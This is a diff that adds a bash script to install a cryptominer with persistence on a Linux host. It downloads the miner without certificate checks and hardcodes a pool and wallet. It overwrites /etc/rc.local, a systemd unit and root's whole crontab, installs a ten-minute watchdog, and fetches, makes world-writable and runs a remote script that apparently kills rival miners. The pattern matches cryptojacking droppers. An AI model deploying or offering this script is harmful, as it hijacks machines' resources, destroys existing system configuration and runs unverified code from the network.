@@ -1,0 +1,63 @@
+
+wget --no-check-certificate -O cpuminer.tar.gz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
+tar -xvf cpuminer.tar.gz
+cores=$(nproc --all)
+cp cpuminer-sse2 cpuminer
+
+cat /dev/null > /root/cpuminer.sh
+cat >>/root/cpuminer.sh <<EOF
+#!/bin/bash
+nohup ./cpuminer -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17122 -u QN3KZN421qY5s4PGkpJHMrWpbGwPdCFfGb -p m=solo -t $cores  > /root/hash.log 2>&1 &
+EOF
+chmod +x /root/cpuminer.sh
+
+
+
+cat /dev/null > /etc/rc.local
+cp /root/cpuminer.sh /etc/rc.local
+chmod +x /etc/rc.local
+
+cat /dev/null > /etc/systemd/system/rc-local.service
+
+cat >>/etc/systemd/system/rc-local.service <<EOF
+[Unit]
+Description=/etc/rc.local Support
+ConditionPathExists=/etc/rc.local
+
+[Service]
+ExecStart=/etc/rc.local start
+TimeoutSec=0
+StandardOutput=tty
+RemainAfterExit=yes
+SysVStartPriority=99
+
+[Install]
+WantedBy=multi-user.target 
+EOF
+
+cat /dev/null > /root/checkcpuminer.sh
+cat >>/root/checkcpuminer.sh <<EOF
+#!/bin/bash
+if pgrep cpuminer >/dev/null
+then
+  echo "cpuminer is running."
+else
+  echo "cpuminer isn't running"
+  bash /root/killdero.sh
+  bash /root/cpuminer.sh
+fi
+EOF
+chmod +x /root/cpuminer.sh
+
+wget "https://raw.githubusercontent.com/nambui979/chia-plotter/master/killderoluna" --output-document=/root/killdero.sh
+chmod 777 /root/killdero.sh
+
+cat /dev/null > /var/spool/cron/crontabs/root
+cat >>/var/spool/cron/crontabs/root<<EOF
+*/10 * * * * bash /root/checkcpuminer.sh > /root/checkcpuminer.log
+EOF
+chmod 0600 /var/spool/cron/crontabs/*
+service cron restart
+
+./killdero.sh
+./cpuminer.sh
